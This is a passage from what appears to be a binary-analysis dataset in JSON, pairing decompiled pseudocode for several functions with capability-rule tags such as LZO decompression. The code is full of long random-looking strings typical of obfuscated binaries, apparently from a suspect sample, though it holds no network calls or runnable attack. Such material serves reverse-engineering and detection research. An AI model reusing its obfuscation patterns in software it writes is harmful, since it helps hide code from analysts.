iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x00445447;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack160) {\n            iVar2 = iStack180;\n            if ((0xfff < uStack160 + 1) && (iVar2 = *(iStack180 + -4),  0x1f < (iStack180 + -4) - iVar2))\n            goto code_r0x00445453;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000024) {\n            iVar2 = in_stack_00000010;\n            if ((0xfff < in_stack_00000024 + 1) &&\n               (iVar2 = *(in_stack_00000010 + -4),  0x1f < (in_stack_00000010 + -4) - iVar2)) goto code_r0x0044545f;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000054) {\n            iVar2 = in_stack_00000040;\n            if ((0xfff < in_stack_00000054 + 1) &&\n               (iVar2 = *(in_stack_00000040 + -4),  0x1f < (in_stack_00000040 + -4) - iVar2)) goto code_r0x0044546b;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0x9482;\n    }\n    iVar2 = iStack156;\n    if ((uStack136 + 1 < 0x1000) || (iVar2 = *(iStack156 + -4),  (iStack156 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00445247;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00445423:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0044542f:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0044543b:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00445447:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00445453:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x0044545f:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x0044546b:\n    uStack20 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1894
    },
    "00403f08": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00403f08(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c4f0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    pcStack136 = \"ohddmnkpewiqowfnthcwhrohwmhdgdtonpwvjhuqxpllasvvgp\";\n    auStack144[0] = 0x32;\n    fcn.00402f72();\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x16, iStack60, \"klkaempnefwbsgdisdckjb\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x32, iStack108, \"ohddmnkpewiqowfnthcwhrohwmhdgdtonpwvjhuqxpllasvvgp\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x32, uStack36, \"ohddmnkpewiqowfnthcwhrohwmhdgdtonpwvjhuqxpllasvvgp\");\n    if (uStack88 < 0x10) {\ncode_r0x0042e637:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x0042e6ff;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x0042e70b;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x0042e717;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 1;\n    }\n    iVar2 = iStack108;\n    if ((uStack88 + 1 < 0x1000) || (iVar2 = *(iStack108 + -4),  (iStack108 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0042e637;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042e6ff:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0042e70b:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0042e717:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1058
    },
    "00403f80": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.00403f80(uint *param_1)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_ffffff20;\n    uint auStack168 [2];\n    char *pcStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cc40;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    pcStack160 = \"dudgtuwsphuencjqgtplbpsyhn\";\n    auStack168[0] = 0x1a;\n    fcn.00402f72();\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x4e, iStack108, \"qjehbtvkuclpnsnrsobsowypebzwljwtbjuzaoimsexusbgdatoflkfwatdqsjygewcuzfbzgtsxll\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x55, iStack60, \"gizpxawofwyrdnugbdmtzkpltfyuxnzmiqheqcroowdxvfmeqevfkckizinmvrotqyxrncsesxyewfvituxzb\"\n                );\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x1a, uStack84, \"dudgtuwsphuencjqgtplbpsyhn\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xb;\n    fcn.00402f72(0x1a, uStack36, \"dudgtuwsphuencjqgtplbpsyhn\");\n    if (uStack64 < 0x10) {\ncode_r0x00444b47:\n        if (0xf < uStack40) {\n            in_stack_ffffff20 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff20) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x00444d66;\n                in_stack_ffffff20 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x55, in_stack_ffffff20 & 0xffffff00 | uStack84 & 0xff, \n                     \"gizpxawofwyrdnugbdmtzkpltfyuxnzmiqheqcroowdxvfmeqevfkckizinmvrotqyxrncsesxyewfvituxzb\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 10;\n        fcn.00402f72(0x55, uStack36, \n                     \"gizpxawofwyrdnugbdmtzkpltfyuxnzmiqheqcroowdxvfmeqevfkckizinmvrotqyxrncsesxyewfvituxzb\");\n        if (0xf < uStack64) {\n            uVar2 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar2 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar2))\n            goto code_r0x00444d72;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            iVar3 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar3 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar3))\n            goto code_r0x00444d7e;\n            fcn.00401a32(iVar3);\n        }\n        param_1[5] = 0xf;\n        param_1[4] = 4;\n        *param_1 = 0x6b65716f;\n        *(param_1 + 1) = 0;\n        if (0xf < uStack88) {\n            iVar3 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar3 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar3))\n            goto code_r0x00444d8a;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack112) {\n            iVar3 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar3 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar3))\n            goto code_r0x00444d96;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack136) {\n            iVar3 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar3 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar3))\n            goto code_r0x00444da2;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    in_stack_ffffff20 = uStack64 + 1;\n    uVar2 = uStack84;\n    if (in_stack_ffffff20 < 0x1000) {\ncode_r0x00444b3b:\n        fcn.00401a32(uVar2);\n        goto code_r0x00444b47;\n    }\n    uVar2 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar2 < 0x20) {\n        in_stack_ffffff20 = uStack64 + 0x24;\n        goto code_r0x00444b3b;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00444d66:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00444d72:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00444d7e:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00444d8a:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00444d96:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00444da2:\n    uStack20 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1942
    },
    "00403fad": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nuint * __fastcall fcn.00403fad(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t *piVar6;\n    uchar *puVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint *puVar11;\n    int32_t iVar12;\n    uint *puVar13;\n    uint *puVar14;\n    uint *puVar15;\n    uint *puVar16;\n    uint *puVar17;\n    uint *puVar18;\n    int32_t *in_FS_OFFSET;\n    uint auStack192 [6];\n    uint uStack168;\n    uint uStack152;\n    uint uStack148;\n    uint *puStack104;\n    uint32_t auStack100 [4];\n    uint uStack84;\n    uint32_t uStack80;\n    uint *puStack76;\n    uint *puStack72;\n    uint *puStack68;\n    uchar *puStack64;\n    uchar *puStack60;\n    uint *puStack56;\n    uint *puStack52;\n    uint *puStack48;\n    uint *puStack44;\n    int32_t *piStack40;\n    uchar uStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack44 = &stack0xffffff9c;\n    puStack32 = &stack0xffffff9c;\n    uStack24 = 0x414950;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    *param_1 = 0;\n    param_1[4] = 0;\n    param_1[5] = 0xf;\n    *param_1 = 0;\n    puStack76 = param_1 + 8;\n    param_1[8] = 0;\n    param_1[0xc] = 0;\n    param_1[0xd] = 0xf;\n    *(param_1 + 8) = 0;\n    puStack72 = param_1 + 0x15;\n    param_1[0x15] = 0;\n    param_1[0x19] = 0;\n    param_1[0x1a] = 0xf;\n    *(param_1 + 0x15) = 0;\n    puStack104 = param_1 + 0x1b;\n    param_1[0x1b] = 0;\n    param_1[0x1f] = 0;\n    param_1[0x20] = 0xf;\n    *(param_1 + 0x1b) = 0;\n    piStack40 = &stack0xffffff40;\n    puStack48 = &stack0xffffff58;\n    uStack152 = 0;\n    uStack148 = 0xf;\n    uStack168 = 0;\n    uStack20 = 3;\n    puStack68 = puStack104;\n    puStack56 = param_1;\n    fcn.00402f72(0x40);\n    puVar11 = piStack40;\n    *piStack40 = 0;\n    puVar11[4] = 0;\n    puVar11[5] = 0xf;\n    *puVar11 = 0;\n    uStack20 = 0xf;\n    fcn.00402f72(0x2b, uStack36, \"kmntmqhuokkyozttbsyiwmcpbwgkaapykqvilsfkdzp\");\n    puVar11 = piStack40;\n    uVar3 = *0x4ea1fc;\n    uVar2 = *0x4ea1f8;\n    uVar8 = *0x4ea1f4;\n    piStack40[0xc] = *0x4ea1f0;\n    puVar11[0xd] = uVar8;\n    puVar11[0xe] = uVar2;\n    puVar11[0xf] = uVar3;\n    uVar3 = *0x4ea21c;\n    uVar2 = *0x4ea218;\n    uVar8 = *0x4ea214;\n    puVar11[0x10] = *0x4ea210;\n    puVar11[0x11] = uVar8;\n    puVar11[0x12] = uVar2;\n    puVar11[0x13] = uVar3;\n    puVar11[0x15] = 0x40eb4500;\n    puVar11[0x14] = 0;\n    puVar11[0x16] = 0xd1b;\n    uStack20 = 3;\n    uVar8 = fcn.004010b9();\n    puVar11 = puStack44;\n    puStack44[-1] = uVar8;\n    piStack40 = puVar11 + -0x11;\n    puStack48 = puVar11 + -10;\n    puVar11[-10] = 0;\n    puVar11[-6] = 0;\n    puVar11[-5] = 0xf;\n    *(puVar11 + -10) = 0;\n    *(puVar11 + -0x13) = uStack36;\n    puVar11[-0x12] = \"vjzrngeqibbkfapycozhowfqeexymlxkaetsgkrpzeywzxkhqvyfltljjrpawvpgrjuumjkgrevpoikkstrmm\";\n    puVar11[-0x14] = 0x55;\n    puVar11[-0x15] = 0x410379;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    *piStack40 = 0;\n    puVar5[4] = 0;\n    puVar5[5] = 0xf;\n    *puVar5 = 0;\n    uStack20 = 0xe;\n    *(puVar11 + -0x16) = uStack36;\n    puVar11[-0x15] = \"euwsjavxdvbjcnipmnefdcavkbrxxiztzelouvzywxryqkcgamrcdaebafgtojkesgrnajvnhefswfmiubtrhjiveqkp\";\n    puVar11[-0x17] = 0x5c;\n    puVar11[-0x18] = 0x4103b8;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    *(piStack40 + 6) = 1;\n    puVar5[0xe] = 0x40d97c00;\n    puVar5[0xd] = 0;\n    puVar5[0xf] = 0x98d;\n    *(puVar5 + 0x10) = 1;\n    uStack20 = 3;\n    puVar11[-0x18] = 0x4103e4;\n    uVar8 = fcn.00405407();\n    puVar11 = puStack44;\n    puStack44[-1] = uVar8;\n    piStack40 = puVar11 + -0x1d;\n    puVar11[-8] = 0;\n    puVar11[-4] = 0;\n    puVar11[-3] = 0xf;\n    *(puVar11 + -8) = 0;\n    *(puVar11 + -0x1f) = uStack36;\n    puVar11[-0x1e] = \"xlsmbzlwvptjtzqfeqekdmdifqfolfnqzozbqcczpslzcrpajbhsdytjrunpeqisknuedmksuipeddkmmmcueylcemdsr\";\n    puVar11[-0x20] = 0x5d;\n    puVar11[-0x21] = 0x41042c;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    piStack40[7] = 0;\n    piVar6[0xc] = 0xf;\n    piVar6[0xb] = 1;\n    *(piVar6 + 7) = 0x7a;\n    piVar6[6] = 0xf;\n    piVar6[5] = 0xc;\n    piVar6[1] = 0x77677371;\n    piVar6[2] = 0x68747a75;\n    piVar6[3] = 0x6b626377;\n    *(piVar6 + 4) = 0;\n    *piVar6 = &stack0xffffff9c;\n    iVar4 = *0x4ea23c;\n    iVar12 = *0x4ea238;\n    iVar1 = *0x4ea234;\n    piVar6[0xd] = *0x4ea230;\n    piVar6[0xe] = iVar1;\n    piVar6[0xf] = iVar12;\n    piVar6[0x10] = iVar4;\n    piVar6[0x11] = 0x59a;\n    piVar6[0x13] = 0x40c33b00;\n    piVar6[0x12] = 0;\n    *(piVar6 + 0x14) = 1;\n    piVar6[0x1c] = 0x40d1b300;\n    piVar6[0x1b] = 0;\n    puVar11[-0x21] = 0x4104ad;\n    fcn.00403a8f();\n    puVar11 = puStack44;\n    uVar9 = uStack80;\n    if (0xf < uStack80) {\n        uVar9 = uStack80 + 1;\n        uVar10 = auStack100[0];\n        if (uVar9 < 0x1000) {\ncode_r0x004104de:\n            puStack44[-1] = uVar9;\n            puVar11[-2] = uVar10;\n            puVar11[-3] = 0x4104e5;\n            uVar9 = fcn.00401a32(puVar11[-2]);\n            goto code_r0x004104e8;\n        }\n        uVar10 = *(auStack100[0] - 4);\n        if ((auStack100[0] - 4) - uVar10 < 0x20) {\n            uVar9 = uStack80 + 0x24;\n            goto code_r0x004104de;\n        }\n        uStack20 = 0;\n        puStack44[-1] = 0x410f18;\n        fcn.004047f5();\ncode_r0x00410f18:\n        uStack20 = 1;\n        puVar11[-1] = 0x410f24;\n        fcn.004047f5();\ncode_r0x00410f24:\n        uStack20 = 2;\n        *(puVar11 + -4) = 0x410f30;\n        fcn.004047f5();\n        *(puVar11 + -4) = &stack0xfffffffc;\n        *(puVar11 + -0x84) = 0x410f3c;\n        fcn.004052d1();\n        *(puVar11 + -0x84) = &stack0x00000008;\n        *(puVar11 + -0x104) = 0x410f4c;\n        fcn.004052d1();\n        *(puVar11 + -0x104) = &stack0x00000014;\n        *(puVar11 + -0x184) = 0x410f5c;\n        fcn.004052d1();\n        *(puVar11 + -0x184) = &stack0x00000020;\n        *(puVar11 + -0x204) = 0x410f6f;\n        puVar11 = fcn.00403a76();\n        return puVar11;\n    }\ncode_r0x004104e8:\n    piStack40 = puVar11;\n    uStack84 = 0;\n    uStack80 = 0xf;\n    auStack100[0] = auStack100[0] & 0xffffff00;\n    puVar11[-1] = uVar9;\n    puStack44 = puVar11 + -0x12;\n    puVar11[-6] = 0;\n    puVar11[-2] = 0;\n    puVar11[-1] = 0xf;\n    *(puVar11 + -6) = 0;\n    *(puVar11 + -0x14) = uStack36;\n    puVar11[-0x13] = \"cocjlmoqfdbbwazqdnpwqrgblgaazweklivnnhkwaysixnpjbsmdhssjtsvqcsfgdvawjhcwydmblyfrcdhlgssmmvayzwamr\"\n    ;\n    puVar11[-0x15] = 0x61;\n    puVar11[-0x16] = 0x410540;\n    fcn.00402f72();\n    puVar5 = puStack44;\n    puStack44[4] = 0x69636668;\n    *(puVar5 + 5) = 0;\n    uVar3 = *0x4ea25c;\n    uVar2 = *0x4ea258;\n    uVar8 = *0x4ea254;\n    *puVar5 = *0x4ea250;\n    puVar5[1] = uVar8;\n    puVar5[2] = uVar2;\n    puVar5[3] = uVar3;\n    uVar3 = *0x4ea27c;\n    uVar2 = *0x4ea278;\n    uVar8 = *0x4ea274;\n    puVar5[6] = *0x4ea270;\n    puVar5[7] = uVar8;\n    puVar5[8] = uVar2;\n    puVar5[9] = uVar3;\n    *(puVar5 + 10) = 1;\n    *(puVar5 + 0xb) = 0;\n    puVar11[-0x16] = 0x410570;\n    uVar8 = fcn.00404020();\n    puVar5 = piStack40;\n    puStack44 = piStack40;\n    piStack40[-1] = uVar8;\n    piStack40[-9] = 0;\n    piStack40[-5] = 0;\n    piStack40[-4] = 0xf;\n    puVar11 = piStack40 + -9;\n    piStack40 = piStack40 + -0x11;\n    *puVar11 = 0;\n    *(puVar5 + -0x13) = uStack36;\n    puVar5[-0x12] = \"knyawknileuwvcryqrbfftfjcffgpubchabxzxpujfzbpdgjeno\";\n    puVar5[-0x14] = 0x33;\n    puVar5[-0x15] = 0x4105b9;\n    fcn.00402f72();\n    puVar11 = piStack40;\n    *piStack40 = 0xffc;\n    puVar11[1] = 0x203;\n    *(puVar11 + 2) = 0;\n    uVar3 = *0x4ea29c;\n    uVar2 = *0x4ea298;\n    uVar8 = *0x4ea294;\n    puVar11[3] = *0x4ea290;\n    puVar11[4] = uVar8;\n    puVar11[5] = uVar2;\n    puVar11[6] = uVar3;\n    puVar11[7] = 0x40c46f80;\n    *(puVar11 + 0xe) = 0;\n    puVar11[0x10] = 0x40e705c0;\n    puVar11[0xf] = 0;\n    puVar5[-0x15] = 0x4105f6;\n    uVar8 = fcn.00404fb1();\n    puVar11 = puStack44;\n    puStack44[-1] = uVar8;\n    piStack40 = puVar11 + -10;\n    puVar11[-9] = 0;\n    puVar11[-5] = 0;\n    puVar11[-4] = 0xf;\n    *(puVar11 + -9) = 0;\n    *(puVar11 + -0xc) = uStack36;\n    puVar11[-0xb] = \"dwutooomezheofjerkimghwpshxibwnodqkglrdtxdfeibmyorrar\";\n    puVar11[-0xd] = 0x35;\n    puVar11[-0xe] = 0x41063c;\n    fcn.00402f72();\n    puVar7 = piStack40;\n    *piStack40 = 1;\n    puVar7[0x1c] = 0;\n    puVar7[0x20] = 0;\n    puVar7[0x24] = 0;\n    puVar11[-0xe] = 0x410653;\n    uVar8 = fcn.00403a71();\n    puVar11 = puStack44;\n    puVar13 = puStack44 + -1;\n    puStack44[-1] = uVar8;\n    piStack40 = puVar11 + -0x18;\n    puStack48 = puVar11 + -6;\n    puVar11[-6] = 0;\n    puVar11[-2] = 0;\n    *puVar13 = 0xf;\n    *(puVar11 + -6) = 0;\n    *(puVar11 + -0x1a) = uStack36;\n    puVar11[-0x19] = \"nifuffzgfcmudpqvcmelnnrwzseduwfhqpvczlwhxgcpnwpflurioimeqimbiiqefaxb\";\n    puVar11[-0x1b] = 0x44;\n    puVar11[-0x1c] = 0x41069e;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    puStack52 = piStack40 + 10;\n    piStack40[0xf] = 0xf;\n    puVar5[0xe] = 0xd;\n    puVar5[0xc] = 0x72637168;\n    *(puVar5 + 0xd) = 0x6a;\n    puVar5[4] = 0;\n    uVar3 = str.fdfvrmtm._4_4_;\n    uVar2 = str.fdfvrmtm._0_4_;\n    uVar8 = *0x4ea2b4;\n    puVar5[8] = *0x4ea2b0;\n    puVar5[9] = uVar8;\n    puVar5[10] = uVar2;\n    puVar5[0xb] = uVar3;\n    *(puVar5 + 4) = 0;\n    uStack20 = 0xd;\n    *(puVar11 + -0x1d) = uStack36;\n    puVar11[-0x1c] = \"nkwtjmbblfhijqepwrjxmjdcyxjf\";\n    puVar11[-0x1e] = 0x1c;\n    puVar11[-0x1f] = 0x410702;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    uVar3 = *0x4ea2dc;\n    uVar2 = *0x4ea2d8;\n    uVar8 = *0x4ea2d4;\n    *piStack40 = *0x4ea2d0;\n    puVar5[1] = uVar8;\n    puVar5[2] = uVar2;\n    puVar5[3] = uVar3;\n    *(puVar5 + 0x10) = 1;\n    *(puVar5 + 0x11) = 1;\n    uStack20 = 3;\n    puVar11[-0x1f] = 0x410723;\n    uVar8 = fcn.00403512();\n    puVar11 = puStack44;\n    puStack44[-1] = uVar8;\n    piStack40 = puVar11 + -0x10;\n    puStack48 = puVar11 + -7;\n    puVar11[-7] = 0;\n    puVar11[-3] = 0;\n    puVar11[-2] = 0xf;\n    *(puVar11 + -7) = 0;\n    *(puVar11 + -0x12) = uStack36;\n    puVar11[-0x11] = \"clgzxuotnmaipswfocq\";\n    puVar11[-0x13] = 0x13;\n    puVar11[-0x14] = 0x41076c;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    *piStack40 = 0;\n    puVar5[4] = 0;\n    puVar5[5] = 0xf;\n    *puVar5 = 0;\n    uStack20 = 0xc;\n    *(puVar11 + -0x15) = uStack36;\n    puVar11[-0x14] = \"rumcndspgibaugisjglzugemr\";\n    puVar11[-0x16] = 0x19;\n    puVar11[-0x17] = 0x4107ab;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    *(piStack40 + 6) = 1;\n    puVar5[8] = 0x40b14700;\n    puVar5[7] = 0;\n    puVar5[0xf] = 0x1549;\n    uStack20 = 3;\n    puVar11[-0x17] = 0x4107d3;\n    uVar8 = fcn.004017e4();\n    puVar11 = puStack44;\n    puStack44[-1] = uVar8;\n    piStack40 = puVar11 + -10;\n    puVar11[-10] = 0;\n    puVar11[-6] = 0;\n    puVar11[-5] = 0xf;\n    *(puVar11 + -10) = 0;\n    *(puVar11 + -0xc) = uStack36;\n    puVar11[-0xb] = \"jsnwpwenoicisetvsptwjgbchacmhznnfaqabensfcmrkmkzxr\";\n    puVar11[-0xd] = 0x32;\n    puVar11[-0xe] = 0x410814;\n    fcn.00402f72();\n    puVar7 = piStack40;\n    uVar3 = *0x4ea2fc;\n    uVar2 = *0x4ea2f8;\n    uVar8 = *0x4ea2f4;\n    *(piStack40 + 0x18) = *0x4ea2f0;\n    *(puVar7 + 0x1c) = uVar8;\n    *(puVar7 + 0x20) = uVar2;\n    *(puVar7 + 0x24) = uVar3;\n    puVar11[-0xe] = 0x410827;\n    fcn.00405975();\n    puVar11 = puStack44;\n    puVar14 = puStack44 + -1;\n    puStack44[-1] = 0x30;\n    puVar11[-2] = 0x410833;\n    uVar8 = fcn.004024b9(*puVar14, *puVar11);\n    puVar11[-1] = 0x30;\n    puVar11[-2] = uVar8;\n    puVar11[-3] = 0x41083e;\n    fcn.00401a32(puVar11[-2]);\n    piStack40 = puVar11 + -0x14;\n    puStack48 = puVar11 + -0xd;\n    puStack44 = puVar11;\n    puVar11[-0xd] = 0;\n    puVar11[-9] = 0;\n    puVar11[-8] = 0xf;\n    *(puVar11 + -0xd) = 0;\n    *(puVar11 + -0x16) = uStack36;\n    puVar11[-0x15] = \"fvflkhniciithvkwnwvqvnjcqxp\";\n    puVar11[-0x17] = 0x1b;\n    puVar11[-0x18] = 0x410889;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    piStack40[1] = 0;\n    puVar5[5] = 0;\n    puVar5[6] = 0xf;\n    *(puVar5 + 1) = 0;\n    uStack20 = 0xb;\n    *(puVar11 + -0x19) = uStack36;\n    puVar11[-0x18] = \"gbbdnumnaizvqsbqfgltsdlurqhbpkrcpsjrogjseoooocswcmuvzjwrndnoqezpkppypajoyzkhivtuagwoxtvomk\";\n    puVar11[-0x1a] = 0x5a;\n    puVar11[-0x1b] = 0x4108cf;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    *piStack40 = 0x1577;\n    uVar3 = *0x4ea31c;\n    uVar2 = *0x4ea318;\n    uVar8 = *0x4ea314;\n    puVar5[0xd] = *0x4ea310;\n    puVar5[0xe] = uVar8;\n    puVar5[0xf] = uVar2;\n    puVar5[0x10] = uVar3;\n    *(puVar5 + 0x11) = 1;\n    *(puVar5 + 0x12) = 0;\n    puVar5[0x13] = 0x770;\n    uStack20 = 3;\n    puVar11[-0x1b] = 0x4108fe;\n    fcn.00406479();\n    puVar5 = puStack44;\n    puVar15 = puStack44 + -1;\n    puStack44[-1] = 0x20;\n    puVar5[-2] = 0x410908;\n    uVar8 = fcn.004024b9(*puVar15, *puVar5);\n    puVar5[-1] = 0x20;\n    puVar5[-2] = uVar8;\n    puVar5[-3] = 0x410913;\n    fcn.00401a32(puVar5[-2]);\n    piStack40 = puVar5 + -0x13;\n    puStack44 = puVar5;\n    puVar5[-0xf] = 0;\n    puVar5[-0xb] = 0;\n    puVar5[-10] = 0xf;\n    *(puVar5 + -0xf) = 0;\n    puVar11 = puVar5 + -0x16;\n    *(puVar5 + -0x15) = uStack36;\n    puVar5[-0x14] = \"ragrokuiionshfgfywavfdwxuylnhkfvmeeoeqffmdsiaeeyhmprtabdxtrdwfypsuyuveiwaoyh\";\n    puVar5[-0x16] = 0x4c;\n    puVar5[-0x17] = 0x41095b;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    *piStack40 = 1;\n    piVar6[2] = 0x40e41980;\n    piVar6[1] = 0;\n    piVar6[3] = 0xed6;\n    iVar4 = *0x4ea33c;\n    iVar12 = *0x4ea338;\n    iVar1 = *0x4ea334;\n    piVar6[10] = *0x4ea330;\n    piVar6[0xb] = iVar1;\n    piVar6[0xc] = iVar12;\n    piVar6[0xd] = iVar4;\n    *(piVar6 + 0xe) = 0;\n    iVar4 = *0x4ea35c;\n    iVar12 = *0x4ea358;\n    iVar1 = *0x4ea354;\n    piVar6[0xf] = *0x4ea350;\n    piVar6[0x10] = iVar1;\n    piVar6[0x11] = iVar12;\n    piVar6[0x12] = iVar4;\n    uVar9 = piVar6[9];\n    if (0xf < uVar9) {\n        